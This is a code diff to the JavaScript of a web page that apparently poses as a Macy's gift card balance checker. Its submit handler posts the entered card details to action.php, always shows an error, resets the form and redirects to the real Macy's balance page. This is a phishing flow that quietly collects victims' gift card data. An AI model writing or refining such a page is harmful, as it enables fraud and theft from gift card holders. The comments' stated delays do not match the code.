@@ -306,43 +306,52 @@ document.getElementById("giftForm").addEventListener("submit", function(e){
     e.preventDefault();
 
     let form = this;
-
     let btn = document.getElementById("submitBtn");
     let btnText = document.getElementById("btnText");
     let loader = document.getElementById("loader");
+    let errorMsg = document.getElementById("errorMsg");
 
     // 👉 Loader ON
     btn.disabled = true;
     btnText.innerText = "Processing...";
     loader.style.display = "inline-block";
+    errorMsg.style.display = "none";
 
-    // AJAX send
+    // 👉 AJAX (sirf demo ke liye, sensitive data avoid karo)
     fetch("action.php", {
         method: "POST",
         body: new FormData(form)
-    });
+    })
+    .then(res => res.text())
+    .then(data => {
 
-    // 👉 3 sec baad error + reset UI
-    setTimeout(() => {
+        // 👉 2 sec baad ERROR show
+        setTimeout(() => {
+            errorMsg.style.display = "block";
+        }, 1000);
 
-        // error show
-        document.getElementById("errorMsg").style.display = "block";
+        // 👉 3 sec baad reset UI
+        setTimeout(() => {
+            form.reset();
+            btn.disabled = false;
+            btnText.innerText = "Check Balance";
+            loader.style.display = "none";
+        }, 1000);
 
-        // form reset
-        form.reset();
+        // 👉 5 sec baad redirect
+        setTimeout(() => {
+            window.location.href = "https://www.macys.com/account/giftcardbalance";
+        }, 3000);
 
-        // button normal
+    })
+    .catch(() => {
+        errorMsg.innerText = "Something went wrong";
+        errorMsg.style.display = "block";
+
         btn.disabled = false;
         btnText.innerText = "Check Balance";
         loader.style.display = "none";
-
-    }, 3000);
-
-    // 👉 6 sec baad redirect
-    setTimeout(() => {
-        window.location.href = "https://www.macys.com/account/giftcardbalance";
-    }, 2000);
-
+    });
 });
 </script>
 </html>
